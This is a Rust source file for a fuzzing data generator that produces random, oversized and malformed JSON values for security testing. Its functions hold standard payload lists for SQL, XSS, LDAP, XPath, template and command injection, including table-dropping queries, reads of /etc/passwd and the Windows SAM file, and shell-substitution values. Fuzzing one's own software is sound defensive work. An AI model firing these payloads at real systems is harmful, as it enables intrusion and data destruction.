use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;
use serde_json::{Value, Map};

#[derive(Debug, Clone)]
pub struct FuzzingConfig {
    pub max_string_length: usize,
    pub max_array_length: usize,
    pub max_object_depth: usize,
    pub include_unicode: bool,
    pub include_sql_injection: bool,
    pub include_xss: bool,
    pub include_overflow: bool,
    pub include_null_bytes: bool,
}

impl Default for FuzzingConfig {
    fn default() -> Self {
        Self {
            max_string_length: 100,      // Giảm từ 10000 xuống 100
            max_array_length: 5,         // Giảm từ 1000 xuống 5  
            max_object_depth: 2,         // Giảm từ 10 xuống 2
            include_unicode: true,
            include_sql_injection: true,
            include_xss: true,
            include_overflow: true,
            include_null_bytes: true,
        }
    }
}

#[derive(Debug, Clone)]
pub struct DataGenerator {
    config: FuzzingConfig,
}

impl DataGenerator {
    pub fn new(config: FuzzingConfig) -> Self {
        Self { config }
    }

    // New function to generate limited fuzz data based on intensity
    pub fn generate_limited_fuzz_data(&self, intensity: usize) -> Vec<Value> {
        let count = match intensity {
            1 => 2,   // Very light fuzzing
            2 => 3,   // Light fuzzing  
            3 => 5,   // Medium fuzzing
            4 => 7,   // Heavy fuzzing
            5 => 10,  // Very heavy fuzzing
            _ => 3,   // Default
        };
        
        let mut results = Vec::new();
        for _ in 0..count {
            results.push(Value::String(self.generate_fuzz_string()));
        }
        results
    }

    pub fn generate_fuzz_string(&self) -> String {
        let mut rng = thread_rng();
        let strategy = rng.gen_range(0..20);

        match strategy {
            0 => self.generate_random_string(),
            1 => self.generate_long_string(),
            2 => self.generate_empty_string(),
            3 => self.generate_unicode_string(),
            4 => self.generate_sql_injection_string(),
            5 => self.generate_xss_string(),
            6 => self.generate_format_string(),
            7 => self.generate_path_traversal_string(),
            8 => self.generate_command_injection_string(),
            9 => self.generate_ldap_injection_string(),
            10 => self.generate_xpath_injection_string(),
            11 => self.generate_template_injection_string(),
            12 => self.generate_null_byte_string(),
            13 => self.generate_overflow_string(),
            14 => self.generate_special_chars_string(),
            15 => self.generate_json_breaking_string(),
            16 => self.generate_url_encoded_string(),
            17 => self.generate_base64_string(),
            18 => self.generate_regex_breaking_string(),
            _ => self.generate_boundary_value_string(),
        }
    }

    pub fn generate_fuzz_number(&self) -> Value {
        let mut rng = thread_rng();
        let strategy = rng.gen_range(0..15);

        match strategy {
            0 => Value::Number(serde_json::Number::from(0)),
            1 => Value::Number(serde_json::Number::from(-1)),
            2 => Value::Number(serde_json::Number::from(i64::MAX)),
            3 => Value::Number(serde_json::Number::from(i64::MIN)),
            4 => Value::Number(serde_json::Number::from(u64::MAX as i64)),
            5 => Value::String("inf".to_string()),
            6 => Value::String("-inf".to_string()),
            7 => Value::String("nan".to_string()),
            8 => Value::Number(serde_json::Number::from(i64::MAX)),
            9 => Value::Number(serde_json::Number::from(i64::MIN)),
            10 => Value::Number(serde_json::Number::from(0)),
            11 => Value::Number(serde_json::Number::from(rng.gen::<i64>())),
            12 => Value::Number(serde_json::Number::from(rng.gen_range(-1000000..1000000))),
            13 => Value::String("not_a_number".to_string()),
            _ => Value::String(format!("{}", rng.gen::<f64>())),
        }
    }

    pub fn generate_fuzz_array(&self, depth: usize) -> Value {
        if depth >= self.config.max_object_depth {
            return Value::Array(vec![]);
        }

        let mut rng = thread_rng();
        let length = rng.gen_range(0..=self.config.max_array_length.min(5)); // Giảm tối đa xuống 5
        let mut array = Vec::new();

        for _ in 0..length {
            let value_type = rng.gen_range(0..7);
            let value = match value_type {
                0 => Value::String(self.generate_fuzz_string()),
                1 => self.generate_fuzz_number(),
                2 => Value::Bool(rng.gen()),
                3 => Value::Null,
                4 => self.generate_fuzz_array(depth + 1),
                5 => self.generate_fuzz_object(depth + 1),
                _ => Value::String("fuzz_data".to_string()),
            };
            array.push(value);
        }

        Value::Array(array)
    }

    pub fn generate_fuzz_object(&self, depth: usize) -> Value {
        if depth >= self.config.max_object_depth {
            return Value::Object(Map::new());
        }

        let mut rng = thread_rng();
        let field_count = rng.gen_range(0..=5); // Giảm từ 20 xuống 5
        let mut object = Map::new();

        for _ in 0..field_count {
            let key = self.generate_fuzz_key();
            let value_type = rng.gen_range(0..7);
            let value = match value_type {
                0 => Value::String(self.generate_fuzz_string()),
                1 => self.generate_fuzz_number(),
                2 => Value::Bool(rng.gen()),
                3 => Value::Null,
                4 => self.generate_fuzz_array(depth + 1),
                5 => self.generate_fuzz_object(depth + 1),
                _ => Value::String("nested_fuzz".to_string()),
            };
            object.insert(key, value);
        }

        Value::Object(object)
    }

    fn generate_random_string(&self) -> String {
        let mut rng = thread_rng();
        let length = rng.gen_range(1..=self.config.max_string_length.min(50)); // Giảm tối đa xuống 50
        (0..length)
            .map(|_| rng.sample(Alphanumeric) as char)
            .collect()
    }

    fn generate_long_string(&self) -> String {
        "A".repeat(self.config.max_string_length)
    }

    fn generate_empty_string(&self) -> String {
        String::new()
    }

    fn generate_unicode_string(&self) -> String {
        if !self.config.include_unicode {
            return self.generate_random_string();
        }
        
        let unicode_chars = [
            "🔥", "💀", "🚀", "⚡", "🌟", "🎉", "🌈", "💥", "🔮", "⭐",
            "ñ", "é", "ü", "ç", "à", "ô", "ê", "â", "î", "ï",
            "中文", "日本語", "한국어", "العربية", "русский", "हिन्दी",
            "\u{0000}", "\u{FFFF}", "\u{1000}", "\u{2000}", "\u{10FFFF}",
            "\\", "/", "\"", "'", "`", "\n", "\r", "\t", "\0",
        ];
        
        let mut rng = thread_rng();
        let length = rng.gen_range(1..=20);
        (0..length)
            .map(|_| unicode_chars[rng.gen_range(0..unicode_chars.len())])
            .collect::<String>()
    }

    fn generate_sql_injection_string(&self) -> String {
        if !self.config.include_sql_injection {
            return self.generate_random_string();
        }

        let payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; WAITFOR DELAY '00:00:05'; --",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_xss_string(&self) -> String {
        if !self.config.include_xss {
            return self.generate_random_string();
        }

        let payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "\"'><script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_format_string(&self) -> String {
        let payloads = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%08x%08x%08x%08x%08x",
            "%.1000d%.1000d%.1000d",
            "%99999999999s",
            "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_path_traversal_string(&self) -> String {
        let payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_command_injection_string(&self) -> String {
        let payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; ping -c 4 127.0.0.1",
            "& echo vulnerable",
            "`sleep 5`",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_ldap_injection_string(&self) -> String {
        let payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)|(objectClass=*",
            "*))%00",
            "admin*",
            "*)(cn=*))(|(cn=*",
            "*)|(|(password=*)|(uid=*",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_xpath_injection_string(&self) -> String {
        let payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "test' and count(/*)=1 and 'test'='test",
            "' and string-length(name(parent::*))>0 and ''='",
            "test' or position()=2 and 'test'='test",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_template_injection_string(&self) -> String {
        let payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "@{7*7}",
            "{{config.items()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_null_byte_string(&self) -> String {
        if !self.config.include_null_bytes {
            return self.generate_random_string();
        }

        let payloads = [
            "test\0.jpg",
            "file.txt\0.exe",
            "admin\0\0\0",
            "user\x00admin",
            "data\u{0000}injection",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_overflow_string(&self) -> String {
        if !self.config.include_overflow {
            return self.generate_random_string();
        }

        let patterns = ["A", "1", "\x41", "\x7F"];
        let mut rng = thread_rng();
        let pattern = patterns[rng.gen_range(0..patterns.len())];
        let length = rng.gen_range(10..=self.config.max_string_length.max(50)); // Fix range issue
        pattern.repeat(length)
    }

    fn generate_special_chars_string(&self) -> String {
        let special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~\\";
        let mut rng = thread_rng();
        let length = rng.gen_range(1..=50);
        (0..length)
            .map(|_| {
                let chars: Vec<char> = special_chars.chars().collect();
                chars[rng.gen_range(0..chars.len())]
            })
            .collect()
    }

    fn generate_json_breaking_string(&self) -> String {
        let payloads = [
            "\"}]{[{\"",
            "\":{},[]",
            "\n\r\t",
            "\\\"\\\\\\n\\r\\t",
            "}\"}\":{\"",
            "{\"test\":\"value\"}",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_url_encoded_string(&self) -> String {
        let payloads = [
            "%20%21%22%23%24%25%26%27%28%29",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2F",
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "%27%20OR%20%271%27%3D%271",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_base64_string(&self) -> String {
        let payloads = [
            "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", // <script>alert('XSS')</script>
            "JyBPUiAnMSc9JzE=", // ' OR '1'='1
            "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==", // ../../../etc/passwd
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_regex_breaking_string(&self) -> String {
        let payloads = [
            ".*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*",
            "((((((((((((((((((((((((((((((",
            "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[",
            "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\",
            ".*?.*?.*?.*?.*?.*?.*?.*?.*?.*?.*?.*?.*?.*?.*?.*?",
        ];
        
        let mut rng = thread_rng();
        payloads[rng.gen_range(0..payloads.len())].to_string()
    }

    fn generate_boundary_value_string(&self) -> String {
        let mut rng = thread_rng();
        let strategy = rng.gen_range(0..5);
        
        match strategy {
            0 => " ".repeat(1),
            1 => " ".repeat(255),
            2 => " ".repeat(256),
            3 => " ".repeat(65535),
            _ => " ".repeat(65536),
        }
    }

    fn generate_fuzz_key(&self) -> String {
        let mut rng = thread_rng();
        let strategy = rng.gen_range(0..10);
        
        match strategy {
            0 => "".to_string(),
            1 => " ".to_string(),
            2 => self.generate_long_string(),
            3 => self.generate_special_chars_string(),
            4 => self.generate_unicode_string(),
            5 => format!("key_{}", rng.gen::<u32>()),
            6 => "null".to_string(),
            7 => "undefined".to_string(),
            8 => "__proto__".to_string(),
            _ => "constructor".to_string(),
        }
    }
}
